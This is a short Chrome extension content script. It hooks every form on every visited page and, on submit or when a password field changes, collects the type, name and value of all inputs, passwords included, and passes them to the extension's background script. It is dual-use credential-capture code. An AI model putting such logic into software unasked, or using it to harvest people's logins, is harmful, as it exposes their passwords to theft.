const sendMessage = (data) => chrome.runtime.sendMessage(data);

console.log("Content scripts engaged!");
/**
 * Find all the forms and add submit listener
 */
Array.from(document.forms).forEach((form) => {
    const inputs = form.getElementsByTagName("input");
    form.addEventListener(
        "submit",
        () => {
            sendMessage({
                type: "submit",
                form: Array.from(inputs).map((i) => ({
                    type: i.type,
                    name: i.name,
                    value: i.value,
                })),
            });
        },
        false
    );

    const passwords = Array.from(inputs).filter((i) => i.type === "password");
    if (passwords.length === 0) return;

    // Problem with google, dynamically loaded fields are not picked up
    // Possibly add listener for more password fields
    passwords.forEach((p) => {
        p.addEventListener("change", () => {
            sendMessage({
                type: "change",
                form: Array.from(inputs).map((i) => ({
                    type: i.type,
                    name: i.name,
                    value: i.value,
                })),
            });
        });
    });
});
